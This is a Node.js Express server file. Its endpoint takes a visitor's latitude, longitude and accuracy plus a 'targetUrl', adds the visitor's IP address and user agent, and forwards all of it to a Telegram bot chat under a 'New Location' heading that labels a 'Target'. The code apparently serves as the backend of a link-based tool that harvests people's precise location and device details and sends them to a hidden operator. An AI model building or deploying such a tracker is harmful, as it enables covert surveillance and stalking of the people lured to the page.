import express from 'express';
import fetch from 'node-fetch';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

// JSON body parser
app.use(express.json());

// Static files (public folder)
app.use(express.static(path.join(__dirname, 'public')));

// ─── API endpoint ───
app.post('/api/send', async (req, res) => {
    const { lat, lng, accuracy, targetUrl } = req.body || {};

    if (!lat || !lng) {
        return res.status(400).json({ error: 'lat/lng required' });
    }

    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID   = process.env.CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
        console.error('Missing BOT_TOKEN or CHAT_ID');
        return res.status(500).json({ error: 'server config missing' });
    }

    const ua = req.headers['user-agent'] || 'unknown';
    const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '')
                .split(',')[0].trim();

    const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;

    const text =
`📍 New Location
━━━━━━━━━━━━━━
🗺 Map: ${mapLink}
📌 Lat: ${lat}
📌 Lng: ${lng}
🎯 Accuracy: ${Math.round(accuracy || 0)}m
🌐 Target: ${targetUrl || 'n/a'}
🖥 IP: ${ip}
📱 UA: ${ua.slice(0, 100)}
🕒 ${new Date().toLocaleString('en-GB', { timeZone: 'Asia/Yangon' })}
━━━━━━━━━━━━━━`;

    try {
        const tgRes = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text,
                    disable_web_page_preview: false
                })
            }
        );

        const data = await tgRes.json();

        if (!data.ok) {
            console.error('Telegram error:', data.description);
            return res.status(200).json({ ok: false, description: data.description });
        }

        return res.status(200).json({ ok: true });

    } catch (err) {
        console.error('Send error:', err.message);
        return res.status(500).json({ error: err.message });
    }
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', time: new Date().toISOString() });
});

// SPA fallback: ကျန်တဲ့ route အားလုံး index.html ကို ပို့
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ─── Start server ───
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});